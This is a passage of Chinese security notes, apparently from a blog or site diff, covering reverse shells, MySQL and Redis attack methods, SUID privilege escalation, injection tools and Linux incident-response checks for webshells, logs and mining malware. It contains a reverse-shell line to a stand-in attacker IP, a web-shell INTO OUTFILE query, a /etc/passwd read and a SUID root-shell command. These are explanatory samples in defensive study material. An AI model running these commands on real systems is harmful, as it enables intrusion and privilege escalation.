+<p>bash</p>
+<p>这里，-l表示监听模式，-v表示冗长输出，-p指定端口。</p>
+<p>目标系统执行恶意代码：攻击者通过漏洞利用、社交工程等手段，在目标系统上执行恶意代码。这段代码会打开一个Shell，并尝试连接攻击者的服务器。</p>
+<p>&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attacker_ip&#x2F;4444 0&gt;&amp;1</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>这个命令的作用是通过TCP连接攻击者的IP地址和端口，并将输入和输出重定向到这个连接上。</p>
+<p>建立连接：目标系统主动向攻击者的服务器发起连接请求。由于是目标系统主动连接，一般不会被防火墙阻拦。</p>
+<p>攻击者获得Shell访问：一旦连接建立，攻击者就可以在其控制服务器上得到一个远程Shell，能够像在本地终端一样执行命令，控制目标系统。</p>
+<p>那这里要找出黑客反弹的shell，我们可以通过查看日志进行分析，具体方法看后面的日志分析思路；</p>
+<p>2.检测基本步骤</p>
+<p>检查日志文件：查看MySQL的日志文件，特别是查询日志和错误日志。这些日志可以提供关于执行的查询和任何异常情况的信息。</p>
+<p>查询日志：记录所有的查询，包括成功和失败的查询。</p>
+<p>错误日志：记录MySQL服务器的错误、警告和通知。</p>
+<p>这些日志通常位于&#x2F;var&#x2F;log&#x2F;mysql&#x2F;目录下。</p>
+<p>检查审计日志：如果启用了审计插件，可以查看审计日志。MySQL Enterprise Edition包含一个审计插件，可以记录所有SQL查询。</p>
+<p>检查连接历史：检查MySQL中的连接历史，找出哪些IP地址连接过数据库。可以通过查询information_schema.processlist或performance_schema来获取连接信息。</p>
+<p>检查特定的表和列：查找数据库中是否有存储和执行恶意命令的痕迹，例如system或exec等。</p>
+<p>（六）mysql常用提取方式</p>
+<p>在 MySQL 提权攻击中，最常用的一些方法包括利用 INTO OUTFILE 写入文件、利用 LOAD_FILE 读取文件，以及利用 UDF（用户定义函数）执行系统命令。这些方法因其简单高效、攻击面广而被广泛采用。</p>
+<p>1.利用 INTO OUTFILE 写入文件</p>
+<p>INTO OUTFILE 是 MySQL 提供的一个功能，允许将查询结果写入服务器上的文件。如果攻击者能成功利用这个功能，他们可以将恶意代码写入 Web 服务器目录，生成一个 Web Shell。</p>
+<p>示例：</p>
+<p>SELECT ‘<?php system($_GET["cmd"]); ?>‘ INTO OUTFILE ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’;</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>这个命令将在 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下创建一个名为 shell.php 的文件，包含一个简单的 Web Shell，攻击者可以通过访问该文件执行任意系统命令。</p>
+<p>2.利用 LOAD_FILE 读取文件</p>
+<p>LOAD_FILE 是 MySQL 提供的另一个功能，允许读取服务器上的文件内容。攻击者可以利用这个功能读取敏感文件，如系统密码文件 &#x2F;etc&#x2F;passwd。</p>
+<p>示例：</p>
+<p>SELECT LOAD_FILE(‘&#x2F;etc&#x2F;passwd’);</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>这个命令会返回 &#x2F;etc&#x2F;passwd 文件的内容，其中包含所有用户的信息。</p>
+<p>3.利用 UDF 执行系统命令</p>
+<p>UDF（用户定义函数）允许用户扩展 MySQL 的功能。如果攻击者可以将恶意的共享库上传到服务器，他们可以利用 UDF 执行任意系统命令。</p>
+<p>常用方法总结</p>
+<p>INTO OUTFILE 写入文件：常用于创建 Web Shell 或写入恶意脚本。</p>
+<p>LOAD_FILE 读取文件：常用于读取敏感文件，进行信息收集。</p>
+<p>UDF 执行系统命令：常用于执行任意系统命令，获取更高权限。</p>
+<p>（七）redis</p>
+<p>1.简介</p>
+<p>Redis 是一个开源的、内存中的数据结构存储系统，用作数据库、缓存和消息代理。它支持多种数据结构，如字符串、散列、列表、集合、有序集合、位图、HyperLogLogs 和地理空间索引半径查询。以下是 Redis 的一些关键特性和用途：</p>
+<p>2.关键特性</p>
+<p>高性能：由于 Redis 是内存数据库，数据存储和读取的速度非常快。每秒可以执行数百万次操作。</p>
+<p>多种数据结构：Redis 支持多种数据结构，使其非常灵活，能够适应不同类型的应用场景。支持的结构包括：字符串（Strings）、列表（Lists）、集合（Sets）、有序集合（Sorted Sets）、哈希（Hashes）、位图（Bitmaps）等。</p>
+<p>持久化：虽然 Redis 是内存数据库，但它支持将数据持久化到磁盘上，以防数据丢失。两种持久化方式：RDB（快照）和 AOF（追加文件）。</p>
+<p>复制（Replication）：Redis 支持主从复制，可以将数据从一个 Redis 服务器复制到多个从服务器，提供数据冗余和高可用性。</p>
+<p>高可用性：Redis 通过 Redis Sentinel 提供高可用性。Sentinel 监控 Redis 主从实例，并在主服务器不可用时自动进行故障转移。</p>
+<p>集群（Cluster）：Redis Cluster 提供自动分片和高可用性，允许 Redis 数据分布在多个节点上。</p>
+<p>事务：支持事务，可以保证一组命令的原子性。</p>
+<p>脚本：Redis 支持 Lua 脚本，使得可以在 Redis 服务器端执行复杂的逻辑。</p>
+<p>3.基本的常见用途</p>
+<p>缓存：由于 Redis 的高性能，常被用作缓存来存储频繁访问的数据，减少数据库负载和提高应用响应速度。</p>
+<p>会话存储：Redis 可以用来存储用户会话数据，如网站的用户登录会话等。</p>
+<p>消息队列：Redis 支持发布&#x2F;订阅、列表和有序集合，因此可以用作简单的消息队列系统。</p>
+<p>实时分析：Redis 可以用于实时数据分析和统计，如计数器、唯一用户统计等。</p>
+<p>排行榜&#x2F;计分板：由于有序集合的支持，Redis 非常适合实现排行榜和计分板功能。</p>
+<p>地理空间数据：Redis 提供了内置的地理空间数据类型和命令，可以处理和查询地理位置数据。Redis 的强大功能和灵活性使其在现代应用中得到了广泛的应用，包括社交网络、实时分析、缓存、会话管理和队列处理等领域。</p>
+<p>4.攻击Redis的手法</p>
+<p>未授权访问：缺乏身份验证。默认情况下，Redis 不要求身份验证，攻击者可以直接连接到 Redis 实例并执行任意命令。</p>
+<p>开放的网络接口：如果 Redis 监听在一个公共的 IP 地址上，攻击者可以通过网络远程访问 Redis 实例。</p>
+<p>远程代码执行：CONFIG 命令：攻击者可以利用未授权访问，通过 CONFIG 命令修改配置，例如设置 dir 和 dbfilename 来写入恶意文件，从而在目标服务器上执行代码。</p>
+<p>模块加载：Redis 允许加载自定义模块，如果没有进行适当的访问控制，攻击者可以加载恶意模块并执行任意代码。</p>
+<p>持久化攻击：持久化文件劫持：攻击者可以修改 Redis 的持久化配置（如 RDB 或 AOF 文件），然后写入恶意数据，当 Redis 重启时执行恶意操作。</p>
+<p>恶意数据注入：通过注入恶意数据到持久化文件中，攻击者可以在数据恢复时触发恶意行为。</p>
+<p>拒绝服务攻击（DoS）：资源耗尽：通过发送大量请求或存储大量数据，攻击者可以耗尽 Redis 服务器的内存或 CPU 资源，导致服务不可用。大键值操作：操作超大键值（如大列表或集合）可能会导致 Redis 性能下降，甚至崩溃。</p>
+<p>数据篡改和泄露：数据窃取：未经授权的访问可以导致敏感数据的泄露。数据篡改：攻击者可以修改或删除关键数据，影响系统的正常运行。</p>
+<p>（八）SUID提取</p>
+<p>1.简介</p>
+<p>SUID（Set User ID）是 Unix&#x2F;Linux 文件系统中的一种权限位。当文件的 SUID 位被设置时，执行该文件的用户将临时获得文件所有者的权限。这通常用于程序需要执行一些需要更高权限的操作（例如，ping 命令需要发送 ICMP 请求，因此需要 root 权限）。</p>
+<p>查找命令：</p>
+<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>find &#x2F;: 从根目录开始查找。</p>
+<p>-perm -u&#x3D;s: 查找文件权限中包含 SUID 位（即，用户执行该文件时将获得该文件所有者的权限）。</p>
+<p>-type f: 只查找文件（不包括目录）。</p>
+<p>2&gt;&#x2F;dev&#x2F;null: 将标准错误输出重定向到 &#x2F;dev&#x2F;null，以避免显示权限不足等错误信息。</p>
+<p>2.SUID 提权安全隐患</p>
+<p>如果某个 SUID 程序存在漏洞，攻击者可以利用该漏洞，以文件所有者的权限（通常是 root）执行任意代码，从而实现提权。</p>
+<p>3.常规的 SUID 提权方法</p>
+<p>查找 SUID 文件： 使用 find 命令查找系统中的所有 SUID 文件：</p>
+<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>检查可疑文件： 查看找到的 SUID 文件，寻找常见的提权工具（如 nmap、vim、find、awk、perl 等）是否在列表中。这些工具如果被设置为 SUID，有可能被利用来执行任意命令。</p>
+<p>利用漏洞： 如果找到的 SUID 文件有已知的漏洞，可以利用这些漏洞来执行任意命令。例如，某些版本的 nmap 可以通过 –interactive 模式获得一个 shell，进而提权。</p>
+<p>4.判断文件是否可能被利用进行提权</p>
+<p>不应拥有 SUID 位的程序： 如常见编辑器（vim）、网络工具（tcpdump）、脚本语言解释器（perl）等。如果这些程序被设置了 SUID 位，通常是异常情况，需要进一步检查。</p>
+<p>检查文件的所有权和权限： 例如，一个 root 所有的文件，其权限中包含 SUID 位，可以通过 ls -l 命令查看文件的详细信息。如果发现可疑文件，可以进一步分析其行为。</p>
+<p>示例：利用 SUID find 获取 root shell</p>
+<p>假设 find 命令具有 SUID 位，可以使用以下方法获取 root shell：</p>
+<p>&#x2F;usr&#x2F;bin&#x2F;find . -exec &#x2F;bin&#x2F;sh ; -quit</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>这里，find 将在当前目录（.）搜索，并使用 -exec 选项执行 &#x2F;bin&#x2F;sh（一个新的 shell）。因为 find 具有 SUID 位，这个 shell 将以 root 权限运行。</p>
+<p>（九）注入工具</p>
+<p>常用的注入工具，包括了不同类型的工具，如命令注入、SQL注入、代码注入等。</p>
+<p>SQLMap</p>
+<p>描述：一个开源的自动化SQL注入工具，能够识别和利用SQL注入漏洞并接管数据库服务器。</p>
+<p>用法：适用于各种数据库管理系统（如MySQL、PostgreSQL、Oracle、Microsoft SQL Server等）的SQL注入攻击。</p>
+<p>Havij</p>
+<p>描述：一个自动化的SQL注入工具，具有图形用户界面，能够轻松利用SQL注入漏洞。</p>
+<p>用法：用于挖掘和利用SQL注入漏洞，特别适用于初学者。</p>
+<p>SQLNinja</p>
+<p>描述：一个专门针对Microsoft SQL Server的SQL注入工具。</p>
+<p>用法：帮助攻击者利用SQL注入漏洞获取系统权限。</p>
+<p>JSQL Injection</p>
+<p>描述：一个开源的跨平台SQL注入工具，支持多种数据库。</p>
+<p>用法：提供图形用户界面，便于用户进行SQL注入攻击。</p>
+<p>Burp Suite</p>
+<p>描述：一个用于测试Web应用程序安全性的综合工具，具有SQL注入模块。</p>
+<p>用法：手动和自动化的SQL注入测试。</p>
+<p>Commix</p>
+<p>描述：一个自动化的命令注入和命令执行工具。</p>
+<p>用法：帮助发现和利用Web应用程序中的命令注入漏洞。</p>
+<p>Metasploit</p>
+<p>描述：一个渗透测试框架，包含多个注入模块（包括SQL注入、命令注入等）。</p>
+<p>用法：广泛用于渗透测试和漏洞利用。</p>
+<p>Cymothoa</p>
+<p>描述：一个后门工具，用于将用户空间代码注入到正在运行的进程中。</p>
+<p>用法：常用于在受感染的系统上持久化存在并隐蔽地运行恶意代码。</p>
+<p>BeEF (Browser Exploitation Framework)</p>
+<p>描述：一个浏览器攻击框架，用于利用浏览器漏洞并在受害者浏览器上执行恶意代码。</p>
+<p>用法：通过浏览器注入代码并控制受害者浏览器会话。</p>
+<p>W3af (Web Application Attack and Audit Framework)</p>
+<p>描述：一个Web应用程序安全扫描器和攻击框架，支持多种注入攻击（如SQL注入、命令注入等）。</p>
+<p>用法：用于自动化扫描和攻击Web应用程序。</p>
+<p>在Linux系统中，通常将 &#x2F;opt 目录用于存放可选的、占用空间较大的第三方软件和应用程序。这些程序通常不是系统自带的，也不是通过系统包管理器（如apt、yum等）安装的。</p>
+<p>（十）执行权限设置Exec</p>
+<p>Linux系统中的 Exec 相关字段，通常用于查看程序执行时的权限设置。这些字段通常可以在文件系统的详细信息（如 ls -l 命令的输出）中找到。具体来说：</p>
+<p>文件权限字段解释：</p>
+<p>文件或目录权限显示的第一个字段是 Exec 字段。</p>
+<p>对于文件，这个字段的值代表了文件的执行权限。</p>
+<p>对于目录，这个字段的值表示该目录是否可以被执行（进入）。</p>
+<p>具体取值：</p>
+<p>如果该字段显示为 r，表示文件具有读权限。</p>
+<p>如果该字段显示为 w，表示文件具有写权限。</p>
+<p>如果该字段显示为 x，表示文件具有执行权限。</p>
+<p>如果该字段显示为 -，表示文件没有相应的权限。</p>
+<p>举个例子；</p>
+<p>例如，一个文件的详细信息可能如下所示：</p>
+<p>-rwxr-xr–</p>
+<p>在这个例子中，Exec 字段的值为 -rwxr-xr–，这表示：</p>
+<p>所有者（Owner）有读、写、执行权限（rwx）。</p>
+<p>组（Group）有读、执行权限（r-x）。</p>
+<p>其他用户（Others）只有读权限（r–）。</p>
+<p>二、应急响应思路</p>
+<p>（一）木马文件排查</p>
+<p>1.查找webshell</p>
+<p>&#x2F;&#x2F;搜索目录下适配当前应用的网页文件&#x2F;var&#x2F;www&#x2F;html，查看内容是否有Webshell特征</p>
+<p>find .&#x2F; type f -name “.jsp” | xargs grep “exec(”</p>
+<p>find .&#x2F; type f -name “.php” | xargs grep “eval(”</p>
+<p>find .&#x2F; type f -name “.asp” | xargs grep “execute(”</p>
+<p>find .&#x2F; type f -name “.aspx” | xargs grep “eval(”</p>
+<p>&#x2F;&#x2F;对于免杀Webshell，可以查看是否使用编码</p>
+<p>find .&#x2F; type f -name “*.php” | xargs grep “base64_decode”</p>
+<p>2.检查计划任务</p>
+<p>crontab -l</p>
+<p>3.检查启动项</p>
+<p>cat &#x2F;etc&#x2F;rc.local</p>
+<p>ls &#x2F;etc&#x2F;init.d&#x2F;</p>
+<p>systemctl list-unit-files –type&#x3D;service</p>
+<p>4.查看网络连接</p>
+<p>netstat -antlp | more</p>
+<p>5.IP访问情况排查</p>
+<p>检查是否存在暴力破解</p>
+<p>grep “shell.php” &#x2F;var&#x2F;log&#x2F;auth.log.1</p>
+<p>cat auth.log.1 |grep “Accepted password”</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>查找ssh爆破root账号</p>
+<p>cat auth.log.1 | grep -a “Failed password for root” | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>查找登录成功IP</p>
+<p>cat auth.log.1 | grep -a “Accepted “ | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>查找爆破用户名字典</p>
+<p>cat auth.log.1 | grep -a “Failed password” |perl -e ‘while($_&#x3D;&lt;&gt;){ &#x2F;for(.*?) from&#x2F;; print “$1\n”;}’|uniq -c|sort -nr</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>（二）日志分析思路</p>
+<p>1.常见排查</p>
+<p>IP统计</p>
+<p>grep -oE ‘([0-9]{1,3}.){3}[0-9]{1,3}’ redis.log | sort | uniq -c | sort -nr</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>文件访问次数</p>
+<p>cat access.log.1 | grep “&#x2F;index.php” | wc -l</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>IP访问次数</p>
+<p>cat access.log.1 | grep “192.168.200.2 - -” | wc -l</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>查找某一时间IP访问</p>
+<p>cat access.log.1 | grep “03&#x2F;Aug&#x2F;2023:08:” | awk ‘{print $1}’ | sort -nr| uniq -c |wc -l</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>修改Redis排查</p>
+<p>sudo grep ‘CONFIG SET’ &#x2F;var&#x2F;log&#x2F;redis.log</p>
+<p>sudo grep ‘SLAVEOF’ &#x2F;var&#x2F;log&#x2F;redis.log</p>
+<p>sudo grep ‘MODULE LOAD’ &#x2F;var&#x2F;log&#x2F;redis.log</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>查找SUID权限文件</p>
+<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>2.一般思路</p>
+<p>查找webshell</p>
+<p>&#x2F;&#x2F;搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征</p>
+<p>find .&#x2F; type f -name “*.jsp” | xargs grep “exec(”</p>
+<p>find .&#x2F; type f -name “.php” | xargs grep “eval(”</p>
+<p>find .&#x2F; type f -name “.asp” | xargs grep “execute(”</p>
+<p>find .&#x2F; type f -name “.aspx” | xargs grep “eval(”</p>
+<p>查看root相关信息</p>
+<p>find .&#x2F; -name “*.php” | xargs grep “root”</p>
+<p>查看进程</p>
+<p>ps -aux</p>
+<p>查看隐藏文件</p>
+<p>find &#x2F; -name “.*”</p>
+<p>————————————————</p>
+<h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a><font style="color:rgb(1, 110, 140);">linux</font></h3><p><a target="_blank" rel="noopener" href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"><font style="color:rgb(0, 116, 163);">Basic Linux Privilege Escalation</font></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 账户信息</span></span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 账户密码文件</span></span><br><span class="line">/etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache2默认配置文件</span></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟网站配置</span></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 配置文件</span></span><br><span class="line">/usr/local/app/php5/lib/php.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache 配置文件</span></span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL 配置文件</span></span><br><span class="line">/etc/my.conf</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04、常见-CMS"><a href="#0x04、常见-CMS" class="headerlink" title="0x04、常见 CMS"></a><font style="color:rgb(0, 136, 145);">0x04、常见 CMS</font></h2><h3 id="DeDeCms"><a href="#DeDeCms" class="headerlink" title="DeDeCms"></a><font style="color:rgb(1, 110, 140);">DeDeCms</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/member/templets/menulit.php</span><br><span class="line">/plus/paycenter/alipay/return_url.php</span><br><span class="line">/plus/paycenter/cbpayment/autoreceive.php</span><br><span class="line">/paycenter/nps/config_pay_nps.php</span><br><span class="line">/plus/task/dede-maketimehtml.php</span><br><span class="line">/plus/task/dede-optimize-table.php</span><br><span class="line">/plus/task/dede-upcache.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a><font style="color:rgb(1, 110, 140);">WordPress</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/wp-admin/includes/file.php</span><br><span class="line">/wp-content/themes/baiaogu-seo/footer.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="Ecshop"><a href="#Ecshop" class="headerlink" title="Ecshop"></a><font style="color:rgb(1, 110, 140);">Ecshop</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">/api/cron.php</span><br><span class="line">/wap/goods.php</span><br><span class="line">/temp/compiled/ur_here.lbi.php</span><br><span class="line">/temp/compiled/pages.lbi.php</span><br><span class="line">/temp/compiled/user_transaction.dwt.php</span><br><span class="line">/temp/compiled/history.lbi.php</span><br><span class="line">/temp/compiled/page_footer.lbi.php</span><br><span class="line">/temp/compiled/goods.dwt.php</span><br><span class="line">/temp/compiled/user_clips.dwt.php</span><br><span class="line">/temp/compiled/goods_article.lbi.php</span><br><span class="line">/temp/compiled/comments_list.lbi.php</span><br><span class="line">/temp/compiled/recommend_promotion.lbi.php</span><br><span class="line">/temp/compiled/search.dwt.php</span><br><span class="line">/temp/compiled/category_tree.lbi.php</span><br><span class="line">/temp/compiled/user_passport.dwt.php</span><br><span class="line">/temp/compiled/promotion_info.lbi.php</span><br><span class="line">/temp/compiled/user_menu.lbi.php</span><br><span class="line">/temp/compiled/message.dwt.php</span><br><span class="line">/temp/compiled/admin/pagefooter.htm.php</span><br><span class="line">/temp/compiled/admin/page.htm.php</span><br><span class="line">/temp/compiled/admin/start.htm.php</span><br><span class="line">/temp/compiled/admin/goods_search.htm.php</span><br><span class="line">/temp/compiled/admin/index.htm.php</span><br><span class="line">/temp/compiled/admin/order_list.htm.php</span><br><span class="line">/temp/compiled/admin/menu.htm.php</span><br><span class="line">/temp/compiled/admin/login.htm.php</span><br><span class="line">/temp/compiled/admin/message.htm.php</span><br><span class="line">/temp/compiled/admin/goods_list.htm.php</span><br><span class="line">/temp/compiled/admin/pageheader.htm.php</span><br><span class="line">/temp/compiled/admin/top.htm.php</span><br><span class="line">/temp/compiled/top10.lbi.php</span><br><span class="line">/temp/compiled/member_info.lbi.php</span><br><span class="line">/temp/compiled/bought_goods.lbi.php</span><br><span class="line">/temp/compiled/goods_related.lbi.php</span><br><span class="line">/temp/compiled/page_header.lbi.php</span><br><span class="line">/temp/compiled/goods_script.html.php</span><br><span class="line">/temp/compiled/index.dwt.php</span><br><span class="line">/temp/compiled/goods_fittings.lbi.php</span><br><span class="line">/temp/compiled/myship.dwt.php</span><br><span class="line">/temp/compiled/brands.lbi.php</span><br><span class="line">/temp/compiled/help.lbi.php</span><br><span class="line">/temp/compiled/goods_gallery.lbi.php</span><br><span class="line">/temp/compiled/comments.lbi.php</span><br><span class="line">/temp/compiled/myship.lbi.php</span><br><span class="line">/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php</span><br><span class="line">/includes/modules/cron/auto_manage.php</span><br><span class="line">/includes/modules/cron/ipdel.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP168"><a href="#PHP168" class="headerlink" title="PHP168"></a><font style="color:rgb(1, 110, 140);">PHP168</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/admin/inc/hack/count.php?job=list</span><br><span class="line">/admin/inc/hack/search.php?job=getcode</span><br><span class="line">/admin/inc/ajax/bencandy.php?job=do</span><br><span class="line">/cache/MysqlTime.txt</span><br><span class="line">/PHPcms2008-sp4</span><br></pre></td></tr></table></figure>
+
+<h3 id="CMSeasy"><a href="#CMSeasy" class="headerlink" title="CMSeasy"></a><font style="color:rgb(1, 110, 140);">CMSeasy</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/lib/mods/celive/menu_top.php</span><br><span class="line">/lib/default/ballot_act.php</span><br><span class="line">/lib/default/special_act.php</span><br></pre></td></tr></table></figure>
+
+<font style="color:rgb(0, 0, 0);">  
+</font>
+
+<h1 id="linux-2"><a href="#linux-2" class="headerlink" title="linux"></a>linux</h1><h3 id="文件排查-1"><a href="#文件排查-1" class="headerlink" title="文件排查"></a><font style="color:rgb(79, 79, 79);">文件排查</font></h3><p><strong><font style="color:rgb(77, 77, 77);">（1）敏感目录的文件分析 [类&#x2F;tmp目录，命令目录 &#x2F;usr&#x2F;bin &#x2F;usr&#x2F;sbin等]<br></font>****<font style="color:rgb(77, 77, 77);">ls 用来显示目标列表</font></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-a   显示所有档案及目录（<span class="built_in">ls</span>内定将档案名或目录名称为“.”的视为隐藏，不会列出）；</span><br><span class="line">-C	 多列显示输出结果。这是默认选项；</span><br><span class="line">-l	 以长格式显示目录下的内容列表。输出的信息从左到右依次包括文件名，文件类型、权限模式、硬连接数、所有者、组、文件大小和文件的最后修改时间等；</span><br><span class="line">-t	 用文件和目录的更改时间排序；</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(77, 77, 77);">（2） 查看tmp目录下的文件</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">  ls –alt &#x2F;tmp&#x2F;</font></strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-014.png"></p>
+<p><font style="color:rgb(77, 77, 77);">如图，发现多个异常文件，疑似挖矿程序病毒：</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-015.png"></p>
+<p><font style="color:rgb(77, 77, 77);">对已发现的恶意文件进行分析，查看559.sh脚本内容：脚本先是杀掉服务器上cpu占用大于20%的进</font></p>
+<p><font style="color:rgb(77, 77, 77);">程，然后从远程27.155.87.26（福建，黑客所控制的一个IDC服务器）下载了病毒程序并执行;</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-016.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（3） 查看开机启动项内容，&#x2F;etc&#x2F;init.d 是 &#x2F;etc&#x2F;rc.d&#x2F;init.d 的软链接</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">ls -alt  &#x2F;etc&#x2F;init.d&#x2F;</font></strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-017.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（4） 按时间排序查看指定目录下文件</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">ls -alt | head -n 10</font></strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-018.png"></p>
+<p><font style="color:rgb(77, 77, 77);">针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有线性关联，说明可能被篡改或者其他。</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span> /etc/passwd</span><br><span class="line">（1）Access Time：简写为atime，表示文件的访问时间。当文件内容被访问时，更新这个时间。</span><br><span class="line">（2）Modify Time：简写为mtime，表示文件内容的修改时间，当文件的数据内容被修改时，更新这个时间。 </span><br><span class="line">（3）Change Time：简写为ctime，表示文件的状态时间，当文件的状态被修改时，更新这个时间，例如文件的链接数，大小，权限，Blocks数。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(77, 77, 77);">（5） 查看历史命令记录文件~&#x2F;.bash_history</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">查找~&#x2F;.bash_history命令执行记录，主要分析是否有账户执行过恶意操作系统；命令在linux系统里，只要执行过命令的用户，那么在这个用户的HOME目录下，都会有一个.bash_history的文件记录着这个用户都执行过什么命令；</font></p>
+<p><font style="color:rgb(77, 77, 77);">cat &#x2F;root&#x2F;.bash_history</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（6） 查看操作系统用户信息文件&#x2F;etc&#x2F;passwd</font></strong></p>
